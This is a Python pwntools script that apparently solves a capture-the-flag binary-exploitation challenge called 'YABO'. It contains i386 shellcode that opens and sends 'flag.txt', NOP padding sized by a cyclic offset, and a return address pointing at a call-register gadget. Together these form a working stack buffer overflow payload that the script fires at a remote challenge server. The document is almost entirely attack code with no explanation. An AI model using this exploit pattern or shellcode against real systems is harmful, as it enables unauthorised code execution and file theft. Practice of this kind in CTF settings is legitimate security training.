from pwn import *
context.arch = 'i386'

script = '''
        set follow-fork-mode child
        break *0x80493bc
        break *0x80493c3
        continue
'''

shellcode = asm('''
                xor eax,eax
                xor ecx,ecx

                push eax
                push 0x7478742e
                push 0x67616c66
                mov ebx,esp
                
                mov al,5
                int 0x80

                xor ebx,ebx
                mov cl,al

                mov bl,4
                xor edx,edx

                mov al,187
                int 0x80
            ''')

callrax = 0x0804901d

offset = cyclic_find(0x6b61616c)

payload = b""
payload += shellcode
payload += b"\x90" * (offset - len(shellcode))
payload += p32(callrax)



#server = process("./YABO")
#server = remote("challenge.ctf.games",32762)
#gdb.attach(server,script)
#print(server.recv())
p = remote("challenge.ctf.games",32762)
print(p.recv())
p.send(payload)
print(p.recvall())
#p.interactive()
#server.recvall()
#server.interactive()
p.close()
#server.close()